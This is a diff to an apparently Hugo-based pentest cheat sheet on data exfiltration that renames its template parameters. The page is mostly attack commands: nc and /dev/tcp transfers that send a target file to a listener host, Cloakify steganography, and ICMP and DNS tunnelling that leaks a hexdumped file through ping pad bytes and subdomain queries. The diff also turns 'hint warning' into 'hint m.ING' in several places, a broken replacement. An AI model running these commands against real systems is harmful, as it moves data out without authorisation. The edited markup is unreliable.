@@ -17,11 +17,11 @@ from a device or network.[^mitre-exfiltration]
 Linux encoding/decoding.
 
 ```sh
-cat {{< param "war.tfile" >}} | base64 -w0
+cat {{< param "m.TFILE" >}} | base64 -w0
 ```
 
 ```sh
-cat {{< param "war.tfile" >}} | base64 -d
+cat {{< param "m.TFILE" >}} | base64 -d
 ```
 
 {{<details "Parameters">}}
@@ -32,18 +32,18 @@ cat {{< param "war.tfile" >}} | base64 -d
 Windows encoding/decoding.
 
 ```ps
-certutil -encode {{< param "war.tfile" >}} output.ext
+certutil -encode {{< param "m.TFILE" >}} output.ext
 ```
 
 ```ps
-certutil -decode {{< param "war.tfile" >}} output.ext
+certutil -decode {{< param "m.TFILE" >}} output.ext
 ```
 
 ### Steganography
 
 #### Cloakify [^cloakify]
 ```sh
-python ./cloakify.py {{< param "war.tfile" >}} ./ciphers/topWebsites
+python ./cloakify.py {{< param "m.TFILE" >}} ./ciphers/topWebsites
 ```
 
 Alternatively:
@@ -57,7 +57,7 @@ python ./cloakifyFactory
 #### wget (recursive)
 
 ```sh
-wget -r {{< param "war.rhost" >}}:{{< param "war.lport" >}}
+wget -r {{< param "m.RHOST" >}}:{{< param "m.LPORT" >}}
 ```
 {{<details "Parameters">}}
 - `-r`: Specify recursive download.
@@ -65,7 +65,7 @@ wget -r {{< param "war.rhost" >}}:{{< param "war.lport" >}}
 
 #### curl
 ```sh
-curl {{< param "war.rhost" >}}/{{< param "war.tfile" >}} -o {{< param "war.tfile" >}}
+curl {{< param "m.RHOST" >}}/{{< param "m.TFILE" >}} -o {{< param "m.TFILE" >}}
 ```
 {{<details "Parameters">}}
 - `-o <file>`:  Write to `<file>` instead of stdout.
@@ -73,16 +73,16 @@ curl {{< param "war.rhost" >}}/{{< param "war.tfile" >}} -o {{< param "war.tfile
 
 #### scp
 ```sh
-scp user@{{< param "war.rhost" >}}:/{{< param "war.tfile" >}} .
+scp user@{{< param "m.RHOST" >}}:/{{< param "m.TFILE" >}} .
 ```
 
 #### nc
 
 ```sh
 # Receiver
-nc -nvlp {{< param "war.lport" >}} > {{< param "war.tfile" >}}
+nc -nvlp {{< param "m.LPORT" >}} > {{< param "m.TFILE" >}}
 # Sender
-nc -nv {{< param "war.lhost" >}} {{< param "war.lport" >}} < {{< param "war.tfile" >}}
+nc -nv {{< param "m.LHOST" >}} {{< param "m.LPORT" >}} < {{< param "m.TFILE" >}}
 ```
 
 {{<details "Parameters">}}
@@ -95,17 +95,17 @@ nc -nv {{< param "war.lhost" >}} {{< param "war.lport" >}} < {{< param "war.tfil
 #### `/dev/tcp` [^devref]
 ```sh
 # Receiver
-nc -nvlp {{< param "war.lport" >}} > {{< param "war.tfile" >}}
+nc -nvlp {{< param "m.LPORT" >}} > {{< param "m.TFILE" >}}
 # Sender
-cat {{< param "war.tfile" >}} > /dev/tcp/{{< param "war.lhost" >}}/{{< param "war.lport" >}}
+cat {{< param "m.TFILE" >}} > /dev/tcp/{{< param "m.LHOST" >}}/{{< param "m.LPORT" >}}
 ```
 
 ```sh
 # Sender
-nc -w5 -nvlp {{< param "war.lport" >}} < {{< param "war.tfile" >}}
+nc -w5 -nvlp {{< param "m.LPORT" >}} < {{< param "m.TFILE" >}}
 # Receiver
-exec 6< /dev/tcp/{{< param "war.lhost" >}}/{{< param "war.lport" >}}
-cat <&6 > {{< param "war.tfile" >}}
+exec 6< /dev/tcp/{{< param "m.LHOST" >}}/{{< param "m.LPORT" >}}
+cat <&6 > {{< param "m.TFILE" >}}
 ```
 
 ## Web Servers
@@ -113,8 +113,8 @@ cat <&6 > {{< param "war.tfile" >}}
 ### Python
 
 ```sh
-python -m SimpleHTTPServer {{< param "war.lport" >}}
-python3 -m http.server {{< param "war.lport" >}}
+python -m SimpleHTTPServer {{< param "m.LPORT" >}}
+python3 -m http.server {{< param "m.LPORT" >}}
 ```
 
 [Simple HTTP Server with File Upload](https://gist.github.com/touilleMan/eb02ea40b93e52604938)
@@ -122,27 +122,27 @@ python3 -m http.server {{< param "war.lport" >}}
 ### Ruby
 
 ```sh
-ruby -run -e httpd . -p{{< param "war.lport" >}}
+ruby -run -e httpd . -p{{< param "m.LPORT" >}}
 ```
 
 ```sh
-ruby -r webrick -e 'WEBrick::HTTPServer.new(:Port => {{< param "war.lport" >}}, :DocumentRoot => Dir.pwd).start'
+ruby -r webrick -e 'WEBrick::HTTPServer.new(:Port => {{< param "m.LPORT" >}}, :DocumentRoot => Dir.pwd).start'
 ```
 
 ### Perl
 
 ```sh
-perl -MHTTP::Daemon -e '$d = HTTP::Daemon->new(LocalPort => {{< param "war.lport" >}}) or  +die $!; while($c = $d->accept){while($r = $c->get_request){+$c->send_file_response(".".$r->url->path)}}'
+perl -MHTTP::Daemon -e '$d = HTTP::Daemon->new(LocalPort => {{< param "m.LPORT" >}}) or  +die $!; while($c = $d->accept){while($r = $c->get_request){+$c->send_file_response(".".$r->url->path)}}'
 ```
 
-{{<hint warning>}}
+{{<hint m.ING>}}
 Install `HTTP:Daemon` if not present with: `sudo cpan HTTP::Daemon`
 {{</hint>}}
 
 ### PHP
 
 ```sh
-php -S 127.0.0.1:{{< param "war.lport" >}}
+php -S 127.0.0.1:{{< param "m.LPORT" >}}
 ```
 
 ### NodeJS
@@ -151,14 +151,14 @@ php -S 127.0.0.1:{{< param "war.lport" >}}
 
 ```sh
 npm install -g http-server
-http-server -p {{< param "war.lport" >}}
+http-server -p {{< param "m.LPORT" >}}
 ```
 
 [node-static](https://www.npmjs.com/package/node-static)
 
 ```sh
 npm install -g node-static
-static -p {{< param "war.lport" >}}
+static -p {{< param "m.LPORT" >}}
 ```
 
 ## FTP Servers
@@ -167,14 +167,14 @@ static -p {{< param "war.lport" >}}
 
 ```sh
 pip install pyftpdlib
-python3 -m pyftpdlib -p {{< param "war.lport" >}}
+python3 -m pyftpdlib -p {{< param "m.LPORT" >}}
 ```
 
 ### NodeJS
 
 ```sh
 npm install -g ftp-srv
-ftp-srv ftp://0.0.0.0:{{< param "war.lport" >}} --root ./
+ftp-srv ftp://0.0.0.0:{{< param "m.LPORT" >}} --root ./
 ```
 
 ## Tunneling
@@ -189,7 +189,7 @@ with the following script:
 Generate ICMP packets from the file hexdump.
 
 ```sh
-xxd -p -c 8 {{< param "war.tfile" >}} | while read h; do ping -c 1 -p $h {{< param "war.rhost" >}}; done
+xxd -p -c 8 {{< param "m.TFILE" >}} | while read h; do ping -c 1 -p $h {{< param "m.RHOST" >}}; done
 ```
 
 {{<details "Parameters">}}
@@ -203,7 +203,7 @@ xxd -p -c 8 {{< param "war.tfile" >}} | while read h; do ping -c 1 -p $h {{< par
 - `-p`: You may specify up to 16 "pad" bytes to fill out the packet you send.
 {{</details>}}
 
-{{<hint warning>}}
+{{<hint m.ING>}}
 Match `xxd` columns (`-c 8`) with the data sliced (`packet[ICMP].load[-8:]`) in the script.
 {{</hint>}}
 
@@ -212,17 +212,17 @@ Match `xxd` columns (`-c 8`) with the data sliced (`packet[ICMP].load[-8:]`) in 
 Capture DNS packets data.
 
 ```sh
-sudo tcpdump -n -i {{< param "war.liface" >}} -w dns_exfil.pcap udp and src {{< param "war.rhost" >}} and port 53
+sudo tcpdump -n -i {{< param "m.LIFACE" >}} -w dns_exfil.pcap udp and src {{< param "m.RHOST" >}} and port 53
 ```
 
-{{<hint warning>}}
+{{<hint m.ING>}}
 Remember to point the DNS resolution to where packages are being captured.
 {{</hint>}}
 
 Generate DNS queries.
 
 ```sh
-xxd -p -c 16 {{< param "war.tfile" >}} | while read h; do ping -c 1 ${h}.domain.com; done
+xxd -p -c 16 {{< param "m.TFILE" >}} | while read h; do ping -c 1 ${h}.domain.com; done
 ```
 
 Extract exfiltrated data.
